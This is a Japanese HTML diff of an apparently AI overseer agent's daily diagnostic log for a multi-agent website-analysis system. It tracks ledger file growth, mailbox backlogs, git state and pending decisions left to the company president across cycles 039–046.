+    <h3 class="text-xl font-bold mb-1">Cycle 046 — 2026-07-21（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>新規の綻びなし＝据え置き案件の定点追跡・連休明けの実装往復を次サイクルで確認</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 045・07-20）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド76件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 9通の to/ts/subject 全件確認／<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／<span class="font-mono">last-tick.txt</span>（07-21 01:00・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log・status／台帳サイズ実測（partner ledger・skill-kaizen・ycom coverage＋archive・掲示板 index 4種）／新サイト2件の状態再確認（<span class="font-mono">sites/*.md</span> 北極星・<span class="font-mono">agent-tick.sh</span> dispatch）。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全・新規の綻びなし＝静かなサイクル（据え置き案件の定点追跡が主）</strong>。(1) <strong>O-021 は「tripwire 目前で振動」が常態化</strong>：07-20 daily ycom で archive への退避は実施された（240→<strong>244KB</strong>・履歴不消失）ものの、coverage は 99.5→<strong>99.8KB（100KB まで残り 0.2KB）</strong>＝退避と日次ナラティブの埋め戻しが拮抗。恒久ルール化（棚卸し一括）までこの綱渡りが続く見込み＝判断材料は既に出揃っており新規起票はしない。(2) skill-kaizen 130→<strong>135.5KB</strong>（+5.5KB/日・100KB 超4サイクル目・O-019 8サイクル目）。(3) partner ledger 206.5→<strong>208.6KB</strong>（O-018 <strong>9連続据え置き</strong>・archive 不存在のまま）。(4) git：HEAD 不変（<span class="font-mono">7377ca0</span>）・未コミット 81→<strong>87件（+6）</strong>。(5) mailbox：<span class="font-mono">new/</span> 9通不変。web-hanasaka 宛3通（R-028 引き渡し便含む）は3〜4日 pickup なしだが、<strong>07-18(土)〜07-20(月・海の日)の3連休を挟む間欠応答として正常範囲</strong>＝前サイクルの「週明け月曜に確認」は祝日を織り込んでおらず、正しい確認点は<strong>本日火曜＝連休明け初営業日</strong>（次サイクルで確認）。fujisaka-dev 宛3通は <strong>29日滞留</strong>（不変）。(6) 掲示板 index 4種は 80KB tripwire 内（ycom 57・partner 31・overseer 33・ycom blog 52KB）。(7) 新サイト2件は変化なし＝O-020 <strong>6連続据え置き</strong>（北極星「AI起草・社長確認待ち」・dispatch 6サイトのまま）。(8) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・Slack 13サイクル連続正常。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>O-021 追跡</strong>：coverage 実測 <strong>99,815B（mtime 07-20 02:05＝daily ycom で更新）</strong>・archive 240→<strong>243.8KB</strong>＝退避は回っているが埋め戻しと拮抗し、閾値まで残り 0.2KB で振動。＝🔔 O-021 カードに「振動の常態化」を追記（実害はまだ無し・恒久化待ち）。</li>
+        <li><strong>台帳サイズ実測（前日比）</strong>：<span class="font-mono">data/partner/ledger.md</span> <strong>208.6KB</strong>（206.5→208.6・<span class="font-mono">ledger-archive.md</span> 不存在・O-018 9連続）／<span class="font-mono">data/hp-improve/skill-kaizen.md</span> <strong>135.5KB</strong>（130→135.5・O-019 8サイクル目）。</li>
+        <li><strong>mailbox 内訳</strong>：<span class="font-mono">new/</span> 9通＝fujisaka-dev 宛3通（06-22・<strong>29日滞留</strong>・不変）＋yoshida-dev 宛3通（07-15〜17）＋web-hanasaka 宛3通（07-17〜18）。前日から出入りなし（＝3連休の静止として整合）。<strong>連休明け初営業日（本日）の pickup を次サイクルの確認点に設定</strong>（R-028 引き渡し便を含むため、明日も未 pickup なら「連休説明」は失効＝一手前の連絡対象に格上げ）。</li>
+        <li><strong>新サイト整合（O-020 追跡）</strong>：config 8サイト⇔<span class="font-mono">agent-tick.sh</span> dispatch 6サイト（shigatoyota/osakatoyopet なし）・両サイトの北極星は「AI起草＝社長確認待ち」のまま。変化なし＝6サイクル連続据え置きを明示（再督促はしない）。</li>
+        <li><strong>掲示板整理</strong>：Cycle 044 を index からアーカイブへ収容し、index を「最新（046）＋直近文脈（045）＋未完了の繰り越し」に絞る。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿しない</strong>（新規の綻び・新たなご判断材料なし＝すべて既報案件のトレンド継続。web-hanasaka 未 pickup も祝日を織り込めば正常範囲であり、督促に足る新 datum ではない）。</li>
+        <li><strong>自己改善</strong>：気づき＝「拠点エージェントの pickup 遅延を判定するとき、土日だけでなく<strong>祝日（今回は海の日）を含む営業日カレンダーで判定する</strong>べき。前サイクルの『週明け月曜に確認』は祝日を見落とした確認点設定だった」を <span class="font-mono">skill-kaizen.md</span> K-320 に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 045（2026-07-22 Cycle 047 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 045 — 2026-07-20（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>新規の綻びなし＝据え置き案件の定点追跡＋O-021「侵食速度」の定量化</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 044・07-19）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド77件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 9通の to/ts/subject 全件確認／<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／<span class="font-mono">last-tick.txt</span>（07-20 01:00・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log・status／台帳サイズ実測（partner ledger・skill-kaizen・ycom coverage＋archive・掲示板 index 4種）／新サイト2件の状態再確認（<span class="font-mono">sites/*.md</span> 北極星・<span class="font-mono">agent-tick.sh</span> dispatch）。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全・新規の綻びなし＝静かなサイクル（据え置き案件の定点追跡が主）</strong>。(1) 注目データ＝<strong>O-021 の急性収束（Cycle 060）が侵食されている</strong>：ycom coverage <strong>97→99.5KB（+2.5KB/日）＝100KB tripwire まで残り 0.5KB</strong>・本日 02:00 の daily ycom で再ローテ必至。急性パターンは繰り返し適用可能と実証済みだが、<strong>恒久ルール化しない限り約2日おきに手動収束が要る運用コストが定量化された</strong>＝棚卸し一括（O-021＋O-018＋O-019）の判断材料がさらに具体化（新規起票はせず既存カードの更新に留める）。(2) skill-kaizen 124→<strong>130KB</strong>（+6KB/日＝前日の +16KB/日から鈍化・100KB 超3サイクル目・O-019 7サイクル目）。(3) partner ledger 204→<strong>206.5KB</strong>（O-018 <strong>8連続据え置き</strong>・archive 不存在のまま）。(4) coverage-archive は 236→<strong>240KB</strong>＝退避は継続（履歴不消失）。(5) git 変化なし（新規コミットなし・未コミット81件）。(6) mailbox：<span class="font-mono">new/</span> 9通不変。web-hanasaka 宛3通が2〜3日 pickup なしだが<strong>土日を挟む間欠応答として正常範囲</strong>（週明けの pickup を次サイクルで確認・R-028 引き渡し便を含むため要観察）。fujisaka-dev 宛3通は <strong>28日滞留</strong>（不変）。(7) 掲示板 index 4種は 80KB tripwire 内（ycom 59・partner 31・overseer 35・ycom blog 52KB）。(8) 新サイト2件は変化なし＝O-020 <strong>5連続据え置き</strong>（北極星「AI起草・社長確認待ち」・dispatch 6サイトのまま）。(9) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・Slack 12サイクル連続正常。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>O-021 追跡（侵食の定量化）</strong>：coverage 実測 <strong>99,496B（mtime 07-19 02:12＝daily ycom Cycle 062 で更新）</strong>。07-19 朝の 97KB から +2.5KB＝Cycle 060 の収束が日次ナラティブで埋め戻されるペースを実測。archive は 236→240KB（退避継続）。＝🔔 O-021 カードに「侵食 +2.5KB/日・恒久化しないと約2日おきに手動収束」を追記。</li>
+        <li><strong>台帳サイズ実測（前日比）</strong>：<span class="font-mono">data/partner/ledger.md</span> <strong>206.5KB</strong>（204→206.5・<span class="font-mono">ledger-archive.md</span> 不存在・O-018 8連続）／<span class="font-mono">data/hp-improve/skill-kaizen.md</span> <strong>130KB</strong>（124→130・O-019 7サイクル目）。</li>
+        <li><strong>mailbox 内訳</strong>：<span class="font-mono">new/</span> 9通＝fujisaka-dev 宛3通（06-22・<strong>28日滞留</strong>・不変）＋yoshida-dev 宛3通（07-15〜17）＋web-hanasaka 宛3通（07-17〜18・2〜3日＝週末を挟む正常範囲）。前日から出入りなし（pickup も新規投函もゼロ＝土日の静止として整合）。</li>
+        <li><strong>新サイト整合（O-020 追跡）</strong>：config 8サイト⇔<span class="font-mono">agent-tick.sh</span> dispatch 6サイト（shigatoyota/osakatoyopet なし）・両サイトの北極星は <span class="font-mono">sites/*.md</span> 上で「AI起草＝社長確認待ち」のまま。変化なし＝5サイクル連続据え置きを明示（再督促はしない）。</li>
+        <li><strong>掲示板整理</strong>：Cycle 043 をアーカイブへ収容し、index を「最新（045）＋直近文脈（044）＋未完了の繰り越し」に絞る。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿しない</strong>（新規の綻び・新たなご判断材料なし＝すべて既報案件のトレンド継続。長期据え置き案件を Slack で再督促しない規律〔overseer v0.4〕に従い、O-021 侵食の定量化は掲示板カードの更新のみで伝える）。</li>
+        <li><strong>自己改善</strong>：気づき＝「据え置き案件は『変化なし』とだけ追うのではなく、<strong>劣化・侵食の速度（+KB/日等）を定量化して添える</strong>と、保留し続けた場合の運用コストが具体化し、社長が『いつやるか』を決めやすくなる（督促の言い換えではなく判断材料の追加）」を <span class="font-mono">skill-kaizen.md</span> K-315 に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 044（2026-07-21 Cycle 046 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 044 — 2026-07-19（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>✅O-021 の急性症状を hp-loop が自己解消／hp-loop.md v0.13 の新規律が稼働初日から実働</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 043・07-18）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド76件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 内訳と滞留日数（9通の from/to/ts/subject を全通確認）／<span class="font-mono">hold/</span>（空）／<span class="font-mono">memo-stock/</span>（空）／<span class="font-mono">last-tick.txt</span>（07-19 00:58・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log（新コミット1件）・git status（81件）／台帳サイズ実測（partner ledger・skill-kaizen・ycom coverage＋archive・掲示板 index 4種）／<strong>O-021 追跡＝skill-kaizen K-303/K-309（hp-loop の一次記録）と coverage 実サイズの照合</strong>／<strong>hp-loop.md v0.13 の整合検証（ycom 台帳 §8a last-run 表の実在・在庫トリップワイヤの発動実績）</strong>／新サイト2件の状態再確認（<span class="font-mono">sites/*.md</span> 北極星・<span class="font-mono">agent-tick.sh</span> dispatch）。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全・新規の綻びなし。今サイクルの主役＝良い知らせ2件</strong>。(1) <strong>✅O-021（台帳肥大の構造ギャップ）の急性症状を hp-loop が自己解消</strong>：昨日「現行ローテ規定では割れない」と起票した肥大の実体（アクティブ行内の反復ナラティブ）を、hp-loop ycom <strong>Cycle 060 が既存の「履歴は消さず置き場を変える」解釈内の通常メンテとして収束</strong>（4ページをライブ再取得して現在値を確定→反復「退行なし」履歴を最新2〜3件だけ本文に残し以前は archive 集約＝<strong>104.5→99.8KB</strong>・K-303）。Cycle 061 は残る主因＝<strong>§5 消化済み種の残置</strong>も特定（K-309）。現在 coverage <strong>97KB＝tripwire 内</strong>。＝O-021 は「ルール改定が前提」ではなく<strong>「実証済みパターンの明文化」に軽量化</strong>（棚卸し1回で O-018/019 と一括、の推奨は不変）。(2) <strong>✅hp-loop.md v0.13（07-18・社長指摘契機）の新規律が稼働初日から実働</strong>：ycom 台帳に §8a last-run 表が実在（週次系の未実施は理由・繰越先つきで明記＝規定どおり）・<strong>在庫前進トリップワイヤが初日に R-028（🆕のまま約40サイクル停滞）を web-hanasaka への統合検討として引き渡し</strong>（<span class="font-mono">new/</span> の07-18便で配信中）＝「宣言でなく機械で強制」の設計が機能。(3) <strong>⚠️skill-kaizen は 108→<strong>124KB へ加速</strong></strong>（+16KB/日＝v0.13 初日に6ループが K-301〜K-309 等を大量追記・100KB 超2サイクル目）＝O-019 の前倒し材料が強まる。partner ledger 200→<strong>204KB</strong>（O-018 7連続据え置き）。(4) git 前進＝<span class="font-mono">7377ca0</span>（3Dオフィス屋外拡張＋Codexレビュー実バグ2件修正）・未コミット 79→<strong>81件</strong>。(5) 掲示板 index 4種は 80KB tripwire 内（ycom 55・partner 30・overseer 33・ycom blog 53KB）。(6) 新サイト2件は変化なし＝O-020 <strong>4連続据え置き</strong>。(7) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・fujisaka-dev 宛3通 27日滞留（不変）。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>O-021 追跡（一次記録の照合）</strong>：<span class="font-mono">skill-kaizen.md</span> K-303（Cycle 060＝104,544→99,765B・ライブ再取得で現在値確定→反復履歴を最新2〜3件へ収束・「§0 解釈内の通常メンテ・ただし恒久化の明文化は棚卸し案件として残す」と hp-loop 自身が明記）・K-309（Cycle 061＝残る主因は §5 消化済み種の残置）。coverage 実測 <strong>97KB</strong>（mtime 07-18 15:41）・archive 216→<strong>236KB</strong>（退避が実際に増えている＝履歴不消失）。＝🔔 O-021 カードを「急性解消済み・明文化のみ残る」に更新。</li>
+        <li><strong>hp-loop.md v0.13 整合検証</strong>：版 0.12→<strong>0.13</strong>（07-18・changelog に社長明確化の経緯あり＝統括の無断改変ではない）。ycom coverage <strong>§8a「last-run 表」実在</strong>・Cycle 061 で在庫トリップワイヤ発動＝R-028 引き渡し（<span class="font-mono">M-20260718T152220</span>・web-hanasaka 宛）。SYSTEM.md 版表はまた古くなった＝O-016 差分リストへ追加。</li>
+        <li><strong>台帳サイズ実測（前日比）</strong>：<span class="font-mono">data/partner/ledger.md</span> <strong>204KB</strong>（200→204・⚠️規律なし・<span class="font-mono">ledger-archive.md</span> 不存在・O-018 7連続据え置き）／<span class="font-mono">data/hp-improve/skill-kaizen.md</span> <strong>124KB</strong>（108→124・⚠️加速・O-019 6サイクル目）／<span class="font-mono">ycom coverage</span> <strong>97KB</strong>（104→97・✅自己解消）。</li>
+        <li><strong>mailbox 内訳</strong>：<span class="font-mono">new/</span> 9通＝fujisaka-dev 宛3通（06-22・<strong>27日滞留</strong>・不変）＋yoshida-dev 宛3通（07-15 R-Y27 回答・07-16 Cycle 035・07-17 Cycle 036）＋web-hanasaka 宛3通（07-17 blog PI-034 受領・07-17 R-030 検証・<strong>07-18 R-028 引き渡し</strong>＝いずれも2日以内）。</li>
+        <li><strong>新サイト整合（O-020 追跡）</strong>：config 8サイト⇔<span class="font-mono">agent-tick.sh</span> dispatch 6サイト（shigatoyota/osakatoyopet なし）＝無人未配線・北極星「AI起草・社長確認待ち」のまま。変化なし＝4サイクル連続据え置きを明示（再督促はしない）。</li>
+        <li><strong>掲示板整理</strong>：Cycle 042 をアーカイブへ収容し、index を「最新（044）＋直近文脈（043）＋未完了の繰り越し」に絞る。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿する</strong>（新規のご判断材料＝O-021 好転〔急性解消・棚卸しが軽くなった〕＋skill-kaizen 加速〔124KB〕。既報トレンドの単純リマインドは混ぜず、新 datum に絞って短く）。</li>
+        <li><strong>自己改善</strong>：気づき＝「『規定では割れない構造ギャップ』と断定した翌日に、担当ループが既存原則の解釈内で自己解消した＝統括は『ルール改定が必要』と結論する前に、<strong>既存原則の解釈余地で担当モードが自走できるか</strong>も併記すべき（断定はループの自己解決力を過小評価する）」を <span class="font-mono">skill-kaizen.md</span> K-310 に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 043（2026-07-20 Cycle 045 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 043 — 2026-07-18（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>新規1件＝O-021 起票＝台帳肥大の根はローテ規定の構造ギャップ（O-018/019 と同根）</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 042・07-17）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド78件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 内訳と滞留日数（8通の from/to/ts を全通確認）／<span class="font-mono">hold/</span>（空）／<span class="font-mono">memo-stock/</span>（空）／<span class="font-mono">last-tick.txt</span>（07-18 01:00・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log（<strong>新コミット2件</strong>）・git status（79件）／台帳サイズ実測（partner ledger・skill-kaizen・ycom coverage＋archive・掲示板 index）／<strong>ycom coverage の mtime＋直近 hp-loop ycom サイクルの照合</strong>（自己ローテ発動の有無を実測）／新サイト2件の状態再確認／実ルール版⇔SYSTEM.md 差分照合。</p>
+
+    <div class="border-l-4 border-amber-400 bg-amber-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全（全13エージェント <span class="font-mono">0:idle</span>／<span class="font-mono">status=ok</span>・Slack 復路10サイクル連続・mailbox 定点清浄）。今サイクルの主役＝台帳肥大の"根が1つ"だと判明＝🆕O-021 起票（ローテ規定の構造ギャップ）</strong>。(1) <strong>🆕ycom coverage 104KB（92→104・tripwire 赤）＝ただし hp-loop の落ち度ではない</strong>：hp-loop ycom <strong>Cycle 059（07-17）は規定のローテを全実施済み</strong>（§1 の古サイクル・§3 のクローズ済み R を archive へ移送）。にもかかわらず coverage は約0.5KB しか減らなかった＝<strong>肥大の実体が「アクティブ行の中に積み上がる日次ナラティブ」</strong>（最長行 6,542字＝<span class="font-mono">/price/basic.html</span> の「退行なし」反復が毎日1行に連結）で、<strong>現行ローテ規定（古サイクル／クローズ済みだけが対象）では割れない構造だから</strong>。hp-loop 側は tripwire を赤のまま隠さず報告＋skill-kaizen K-301 に真因を記録済み＝<strong>正しい挙動</strong>。これは<strong>ルール（§0／hp-loop.md）の構造ギャップ＝要・社長承認の改定</strong>＝O-021 に集約。(2) <strong>同じ根が O-018／O-019 の台帳肥大</strong>：partner ledger 192→<strong>200KB</strong>（ローテ規定<strong>皆無</strong>・O-018 6連続据え置き）・skill-kaizen 98→<strong>108KB</strong>（週次棚卸しのみ・O-019 5サイクル目）。3件とも「生きた行の中の履歴が対象外」で共通＝<strong>ローテ規定を『アクティブ行内の履歴』へ広げる改定で一括に直る見込み</strong>（O-021 の推奨）。(3) <strong>git 前進＝新コミット2件</strong>：<span class="font-mono">3866a3a</span>（3Dエージェントオフィス＝トップページ化・旧トップ <span class="font-mono">hub.html</span> 温存）・<span class="font-mono">cf42020</span>（クライアント分析 git 外化）＝ともに構造変更で SYSTEM.md 未反映（O-016 へ追加）。未コミット 85→<strong>79件</strong>。(4) 掲示板 index は 80KB tripwire 内（ycom 56・partner 32・overseer 28・ycom blog 52KB）。(5) 新サイト2件（shigatoyota/osakatoyopet）は<strong>変化なし</strong>＝O-020 <strong>3サイクル連続据え置き</strong>。(6) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>🆕 ycom coverage ローテ実測（O-021 の一次資料）</strong>：<span class="font-mono">data/hp-loop/ycom/coverage.md</span> = <strong>104KB</strong>（92→104・mtime 07-17 18:49＝hp-loop ycom <strong>Cycle 059</strong> で更新）。<span class="font-mono">coverage-archive.md</span> 216KB（205→216＝退避は実際に起きている）。hp-loop の <span class="font-mono">skill-kaizen.md</span> K-301 に真因の一次記録＝<strong>Cycle 059 は規定のローテを全実施したが 104,357→103,804B（約0.5KB減）＝残りは全て「アクティブな状態」</strong>。最長行 6,542字（<span class="font-mono">/price/basic.html</span>）に日次「退行なし」が連結＝<strong>ローテ規定の対象外の履歴</strong>。＝規律ミスではなく規定の構造ギャップ（O-021）。</li>
+        <li><strong>台帳サイズ実測（前日比）</strong>：<span class="font-mono">data/partner/ledger.md</span> <strong>200KB</strong>（192→200・⚠️規律なし・<span class="font-mono">ledger-archive.md</span> 不存在・O-018 6連続据え置き）／<span class="font-mono">data/hp-improve/skill-kaizen.md</span> <strong>108KB</strong>（98→108・⚠️規律なし・100KB 超・O-019 5サイクル目）。</li>
+        <li><strong>mailbox 内訳</strong>：<span class="font-mono">new/</span> 8通＝fujisaka-dev 宛3通（06-22・<strong>26日滞留</strong>・不変）＋yoshida-dev 宛3通（07-15 R-Y27 回答・07-16 Cycle 035・07-17 Cycle 036＝わずかに堆積＝拠点間欠応答待ち）＋web-hanasaka 宛2通（07-17 blog PI-034 受領・07-17 R-030 回答＝いずれも1日未満）。前サイクルの web-hanasaka 宛07-16分は pickup 済み＝往復継続。</li>
+        <li><strong>git 前進</strong>：<span class="font-mono">3866a3a</span>（3Dオフィス＝トップページ化）・<span class="font-mono">cf42020</span>（クライアント分析 git 外）を新規検出。両者は構造変更のため O-016 の SYSTEM.md 差分リストへ追加。未コミット 85→79件（O-009）。</li>
+        <li><strong>新サイト整合（O-020 追跡）</strong>：config 8サイト⇔<span class="font-mono">agent-tick.sh</span> dispatch 6サイト（shigatoyota/osakatoyopet なし）＝無人未配線・北極星 AI 起草のまま。変化なし＝3サイクル連続据え置きを明示（再督促はしない）。</li>
+        <li><strong>掲示板整理</strong>：Cycle 041 をアーカイブへ収容し、index を「最新（043）＋直近文脈（042）＋未完了の繰り越し」に絞る。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿する</strong>（新規＝ycom coverage 必須ローテ不発＋台帳2つ 100KB 超という新しいご判断材料があるため。台帳成長トレンド自体は既報なので繰り返さず、新規 datum に絞って短く）。</li>
+        <li><strong>自己改善</strong>：気づき＝「tripwire 赤を見て『規律ミス』と早合点せず、<strong>担当モードの skill-kaizen（一次記録）を読んで真因を確かめる</strong>＝今回は規定を全実施しても割れない構造ギャップだった。<strong>複数の類似症状（O-018/019/coverage）は根を1つに束ねてから提案</strong>すると社長の対処が1回で済む」を <span class="font-mono">skill-kaizen.md</span> K-302 に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 042 -->
+  <section class="mb-6 border border-gray-200 rounded-lg p-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 042 — 2026-07-17（精密診断・<span class="font-mono">/overseer</span>・新規の綻びなし・規律なし台帳2つの成長継続を実測）</h3>
+    <p class="text-sm text-gray-700">基盤健全・新規の綻びなし。判断待ち5件（O-020/O-018/O-019/O-016/O-014）は全件変化なしのため据え置きを明示のみ。✅mailbox 往復は継続稼働＝07-15 発の web-hanasaka 宛1通 pickup 済み（ycom 往復3日連続稼働）・残る滞留は fujisaka-dev 宛3通のみ（06-22・25日・拠点稼働待ち）。規律なし台帳2つは成長継続＝partner ledger 188→192KB（O-018 5連続据え置き）・skill-kaizen 94→98KB（+4KB/日・まもなく100KB・O-019 4サイクル目）。ycom coverage 87→92KB は規律内。掲示板 index 3種 80KB tripwire 内（ycom 50・partner 33・overseer 28KB）。git 据え置き＝新コミットなし・未コミット 87→85件。新サイト2件（shigatoyota/osakatoyopet）は変化なし＝北極星「AI起草・社長確認待ち」・dispatch 6サイトのまま（O-020 判断待ち・登録翌日なので督促せず）。定点清浄＝孤児 bare hp-loop 0・hold/ 空・memo-stock/ 空・Slack 復路9サイクル連続良好。Slack 投稿なし（同じリマインドを繰り返さない規律）。</p>
+  </section>
+
+  <!-- Cycle 041 -->
+  <section class="mb-6 border border-gray-200 rounded-lg p-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 041 — 2026-07-16（精密診断・<span class="font-mono">/overseer</span>・新規1件＝O-020 起票＝8サイト化の北極星確定＋配線の要否）</h3>
+    <p class="text-sm text-gray-700">基盤健全・実装往復は前進。<strong>今サイクルの主役＝HP解析の8サイト化</strong>：07-15 に滋賀トヨタ・大阪トヨペット（ともに受託・トヨタ系）が config 登録・Cycle 001 手動テスト・ハブ登録・営業デッキ <span class="font-mono">toyota-hp-analysis</span>（ハブ登録✅）まで一気に整備＝綻びは無し（automation.md の段階導入どおり）。ただし北極星が AI 起草のまま未確定＋<span class="font-mono">agent-tick.sh</span> dispatch 未配線＝「登録されたが回らない」固定化を避けるため判断待ちに集約＝<strong>O-020 起票</strong>。mailbox 往復前進＝07-14 発4通 pickup 済み（ycom・yoshida とも往復稼働）・残る滞留は fujisaka-dev 宛3通のみ（06-22・24日）。台帳＝partner ledger 188KB 横ばい（O-018 4連続据え置き）・skill-kaizen 90→94KB（O-019 3サイクル目）・ycom coverage 87KB（規律内）。掲示板 index 5種すべて 80KB tripwire 内。git 前進＝新コミット3件（<span class="font-mono">/questions-deck</span> 新設ほか）・未コミット 82→87件。SYSTEM.md 差分また拡大（8サイト化・/questions-deck・blog-improve 0.2）＝O-016 20サイクル目・繰り越し1行。孤児 bare hp-loop 0・hold/ 空・memo-stock/ 空・Slack 復路8サイクル連続良好。Slack 投稿あり（新規 O-020＝ご判断材料）。</p>
+  </section>
+
+  <!-- Cycle 040 -->
+  <section class="mb-6 border border-gray-200 rounded-lg p-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 040 — 2026-07-15（精密診断・<span class="font-mono">/overseer</span>・新規の綻びなし・✅ycom coverage 自己ローテ発動を確認）</h3>
+    <p class="text-sm text-gray-700">基盤健全・新規の綻びなし。<strong>最重要事実＝「規律が実働した」</strong>：ycom coverage が hp-loop 0.8 の規律どおり <strong>93→86KB へ自己縮小</strong>（<span class="font-mono">coverage-archive.md</span> 180→202KB へ+22KB 退避・履歴は不消失）＝「規律のある台帳は自己修復し、規律のない台帳だけが無限成長する」という O-018/O-019 の論拠を実証。規律なし2台帳は成長継続＝partner ledger 185→188KB（O-018 3連続据え置き）・skill-kaizen 83→90KB（+7KB/日・O-019 2サイクル目）。mailbox 往復の良い知らせ＝07-13 配信の web-hanasaka 宛4通 pickup 済み・07-14 発4通（ack 3＋yoshida-dev report 1）配信中＝ycom 分析⇄実装往復が設計どおり稼働。fujisaka-dev 宛3通 23日滞留のみ。deck-format 初運用は規律どおり（<span class="font-mono">site/decks/ai-hisho/</span> ハブ登録✅）。git 前進＝<span class="font-mono">7fe9618</span>（Codexクロスレビュー GPT-5.6 Sol へ）・未コミット 77→82件。掲示板 index 3種 80KB tripwire 内。孤児 bare hp-loop 0・hold/ 空・memo-stock/ 空・Slack 復路7サイクル連続良好。Slack 投稿なし（鳴らさない規律）。</p>
+  </section>
+
+  <!-- Cycle 039 -->
+  <section class="mb-8">
+    <h3 class="text-lg font-bold mb-1">Cycle 039 — 2026-07-14（精密診断・<span class="font-mono">/overseer</span>・新規1件＝O-019 起票・O-018 悪化）</h3>
